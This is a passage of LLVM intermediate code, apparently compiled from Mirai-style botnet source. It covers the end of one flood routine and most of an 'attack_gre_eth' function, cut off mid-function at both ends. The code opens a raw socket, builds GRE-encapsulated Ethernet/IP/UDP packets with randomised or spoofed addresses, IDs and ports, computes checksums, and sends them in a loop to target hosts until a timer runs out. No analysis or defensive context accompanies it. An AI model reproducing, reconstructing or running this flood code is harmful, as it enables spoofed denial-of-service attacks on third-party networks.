; <label>:308:                                    ; preds = %305
  %309 = call i32 @rand_next()
  %310 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 8
  store i32 %309, i32* %311, align 4
  br label %312

; <label>:312:                                    ; preds = %308, %305
  %313 = load i16, i16* %15, align 2
  %314 = zext i16 %313 to i32
  %315 = icmp eq i32 %314, 65535
  br i1 %315, label %316, label %331

; <label>:316:                                    ; preds = %312
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 3
  store i16 %319, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  %324 = load i16, i16* %323, align 4
  %325 = zext i16 %324 to i32
  %326 = sub nsw i32 %325, 1000
  %327 = xor i32 %326, -1
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  br label %331

; <label>:331:                                    ; preds = %316, %312
  %332 = load i16, i16* %18, align 2
  %333 = zext i16 %332 to i32
  %334 = icmp eq i32 %333, 65535
  br i1 %334, label %335, label %341

; <label>:335:                                    ; preds = %331
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 0
  store i16 %338, i16* %340, align 2
  br label %341

; <label>:341:                                    ; preds = %335, %331
  %342 = load i16, i16* %19, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br i1 %344, label %345, label %351

; <label>:345:                                    ; preds = %341
  %346 = call i32 @rand_next()
  %347 = and i32 %346, 65535
  %348 = trunc i32 %347 to i16
  %349 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %350 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %349, i32 0, i32 1
  store i16 %348, i16* %350, align 2
  br label %351

; <label>:351:                                    ; preds = %345, %341
  %352 = load i8, i8* %22, align 1
  %353 = icmp ne i8 %352, 0
  br i1 %353, label %358, label %354

; <label>:354:                                    ; preds = %351
  %355 = call i32 @rand_next()
  %356 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 9
  store i32 %355, i32* %357, align 4
  br label %364

; <label>:358:                                    ; preds = %351
  %359 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 9
  %361 = load i32, i32* %360, align 4
  %362 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 9
  store i32 %361, i32* %363, align 4
  br label %364

; <label>:364:                                    ; preds = %358, %354
  %365 = load i8, i8* %21, align 1
  %366 = icmp ne i8 %365, 0
  br i1 %366, label %367, label %374

; <label>:367:                                    ; preds = %364
  %368 = load i8*, i8** %34, align 8
  %369 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %368, i32 %369)
  %370 = load i8*, i8** %34, align 8
  %371 = load i32, i32* %20, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds i8, i8* %370, i64 %372
  store i8 0, i8* %373, align 1
  br label %374

; <label>:374:                                    ; preds = %367, %364
  %375 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 0, i16* %376, align 2
  %377 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %378 = bitcast %struct.iphdr* %377 to i16*
  %379 = call zeroext i16 @checksum_generic(i16* %378, i32 20)
  %380 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 7
  store i16 %379, i16* %381, align 2
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* %385, i32 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i32, i32* %20, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %391, i8* %393, i16 zeroext %396, i32 %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %405 = load i32, i32* %11, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 0
  store i16 2, i16* %409, align 4
  %410 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 9
  %412 = load i32, i32* %411, align 4
  %413 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i64 %415
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i32 0, i32 0
  %418 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %417, i32 0, i32 2
  %419 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %418, i32 0, i32 0
  store i32 %412, i32* %419, align 4
  %420 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %421 = load i32, i32* %11, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %424, i32 0, i32 1
  store i16 0, i16* %425, align 2
  %426 = load i32, i32* %12, align 4
  %427 = load i8*, i8** %29, align 8
  %428 = load i32, i32* %20, align 4
  %429 = sext i32 %428 to i64
  %430 = add i64 52, %429
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %426, i8* %427, i64 %430, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

; <label>:441:                                    ; preds = %374
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %251

; <label>:444:                                    ; preds = %251
  %445 = call i64 @time(i64* null) #6
  %446 = load i32, i32* %24, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

; <label>:449:                                    ; preds = %444
  br label %451

; <label>:450:                                    ; preds = %444
  br label %250

; <label>:451:                                    ; preds = %449, %92, %86
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %490

; <label>:95:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %490

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

; <label>:104:                                    ; preds = %260, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %263

; <label>:109:                                    ; preds = %104
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %25, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %26, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.ethhdr*
  store %struct.ethhdr* %126, %struct.ethhdr** %27, align 8
  %127 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %128 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %127, i64 1
  %129 = bitcast %struct.ethhdr* %128 to %struct.iphdr*
  store %struct.iphdr* %129, %struct.iphdr** %28, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i64 1
  %132 = bitcast %struct.iphdr* %131 to %struct.udphdr*
  store %struct.udphdr* %132, %struct.udphdr** %29, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, 15
  %137 = or i8 %136, 64
  store i8 %137, i8* %134, align 4
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, -16
  %142 = or i8 %141, 5
  store i8 %142, i8* %139, align 4
  %143 = load i8, i8* %14, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 66, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %15, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %16, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %17, align 1
  %161 = icmp ne i8 %160, 0
  br i1 %161, label %162, label %166

; <label>:162:                                    ; preds = %109
  %163 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  br label %166

; <label>:166:                                    ; preds = %162, %109
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 47, i8* %168, align 1
  %169 = load i32, i32* %23, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 9
  store i32 %177, i32* %179, align 4
  %180 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %181 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %182 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %184 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %185 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %184, i32 0, i32 2
  store i16 %183, i16* %185, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i32, i32* %20, align 4
  %200 = sext i32 %199 to i64
  %201 = add i64 28, %200
  %202 = trunc i64 %201 to i16
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 2
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %15, align 2
  %207 = zext i16 %206 to i32
  %208 = xor i32 %207, -1
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %16, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %222

; <label>:218:                                    ; preds = %166
  %219 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

; <label>:222:                                    ; preds = %218, %166
  %223 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 17, i8* %224, align 1
  %225 = call i32 @rand_next()
  %226 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load i8, i8* %22, align 1
  %229 = icmp ne i8 %228, 0
  br i1 %229, label %230, label %236

; <label>:230:                                    ; preds = %222
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %244

; <label>:236:                                    ; preds = %222
  %237 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 8
  %239 = load i32, i32* %238, align 4
  %240 = sub i32 %239, 1024
  %241 = xor i32 %240, -1
  %242 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %236, %230
  %245 = load i16, i16* %18, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  store i16 %246, i16* %248, align 2
  %249 = load i16, i16* %19, align 2
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 1
  store i16 %250, i16* %252, align 2
  %253 = load i32, i32* %20, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 8, %254
  %256 = trunc i64 %255 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  br label %260

; <label>:260:                                    ; preds = %244
  %261 = load i32, i32* %11, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %11, align 4
  br label %104

; <label>:263:                                    ; preds = %104
  br label %264

; <label>:264:                                    ; preds = %489, %263
  store i32 0, i32* %11, align 4
  br label %265

; <label>:265:                                    ; preds = %480, %264
  %266 = load i32, i32* %11, align 4
  %267 = load i8, i8* %7, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %266, %268
  br i1 %269, label %270, label %483

; <label>:270:                                    ; preds = %265
  %271 = load i8**, i8*** %13, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds i8*, i8** %271, i64 %273
  %275 = load i8*, i8** %274, align 8
  store i8* %275, i8** %33, align 8
  %276 = load i8*, i8** %33, align 8
  %277 = bitcast i8* %276 to %struct.iphdr*
  store %struct.iphdr* %277, %struct.iphdr** %34, align 8
  %278 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i64 1
  %280 = bitcast %struct.iphdr* %279 to %struct.grehdr*
  store %struct.grehdr* %280, %struct.grehdr** %35, align 8
  %281 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %282 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %281, i64 1
  %283 = bitcast %struct.grehdr* %282 to %struct.ethhdr*
  store %struct.ethhdr* %283, %struct.ethhdr** %36, align 8
  %284 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %285 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %284, i64 1
  %286 = bitcast %struct.ethhdr* %285 to %struct.iphdr*
  store %struct.iphdr* %286, %struct.iphdr** %37, align 8
  %287 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i64 1
  %289 = bitcast %struct.iphdr* %288 to %struct.udphdr*
  store %struct.udphdr* %289, %struct.udphdr** %38, align 8
  %290 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i64 1
  %292 = bitcast %struct.udphdr* %291 to i8*
  store i8* %292, i8** %39, align 8
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = icmp slt i32 %299, 32
  br i1 %300, label %301, label %322

; <label>:301:                                    ; preds = %270
  %302 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %303 = load i32, i32* %11, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %301, %270
  %323 = load i32, i32* %23, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

; <label>:325:                                    ; preds = %322
  %326 = call i32 @rand_next()
  %327 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  store i32 %326, i32* %328, align 4
  br label %329

; <label>:329:                                    ; preds = %325, %322
  %330 = load i16, i16* %15, align 2
  %331 = zext i16 %330 to i32
  %332 = icmp eq i32 %331, 65535
  br i1 %332, label %333, label %348

; <label>:333:                                    ; preds = %329
  %334 = call i32 @rand_next()
  %335 = and i32 %334, 65535
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
